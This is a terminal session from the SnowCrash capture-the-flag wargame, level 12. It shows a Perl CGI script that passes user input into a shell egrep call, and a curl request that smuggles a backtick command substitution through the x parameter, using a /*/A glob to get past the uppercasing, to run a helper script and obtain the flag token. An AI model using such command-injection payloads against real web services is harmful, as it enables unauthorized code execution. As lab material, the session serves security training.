level12@SnowCrash:~$ ls
a.sh  level12.pl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
level12@SnowCrash:~$ cat a.sh
getflag > /tmp/mami
level12@SnowCrash:~$ mv /tmp/A
level12@SnowCrash:~$ curl "localhost:4646?x=\`/*/A\`"
..level12@SnowCrash:~$ cat /tmp/mami
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr